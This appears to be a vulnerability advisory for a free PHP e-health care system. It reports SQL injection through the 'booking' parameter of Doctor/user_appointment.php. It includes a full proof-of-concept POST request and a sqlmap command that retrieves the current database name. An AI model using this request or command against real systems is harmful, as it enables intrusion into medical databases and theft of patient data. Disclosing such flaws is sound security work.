# E-Health Care System IN PHP has sql injection vulnerability via user_appointment.php

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
Doctor/user_appointment.php
## describe
An unrestricted SQL injection attack exists in user_appointment.php of  E-Health Care System . The parameters that can be controlled are as follows:booking . This function executes the $booking parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

## code analysis
The $booking parameters of the user_appointment.php  are not filtered and concatenated into the SQL statement for execution.

![image-20241105141657208](https://github.com/user-attachments/assets/67b06f2f-797d-4e3b-986b-73997bd475cb)

![image-20241105141642635](https://github.com/user-attachments/assets/4b78ddb6-571b-49d8-9c49-040ca755370c)

## Function

![image-20241105140043600](https://github.com/user-attachments/assets/a7655fee-525b-49db-b4b5-b3604c3eda2b)

## POC

```
POST /Doctor/user_appointment.php/user_appointment.php HTTP/1.1
Host: healthcare
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Origin: http://healthcare
Connection: close
Referer: http://healthcare/Doctor/user_appointment.php/
Cookie: PHPSESSID=mpi8lqc1vamegv04jnepb8t7as
Upgrade-Insecure-Requests: 1
Priority: u=0, i

schedule_id=1&schedule_date=2024-11-01&schedule_day=sunday&start_time=02%3A01&end_time=03%3A04&booking=a*&submit=submit
```

save as 1.txt

excute the sqlmap command to get current_dbs.

```
python sqlmap.py -r 1.txt --level 3 --risk 2 --current-db
```

see the results.

get current_database:  online_health_care

![image-20241105141455614](https://github.com/user-attachments/assets/c22597c7-80af-4efc-b0dd-3556d0fed27c)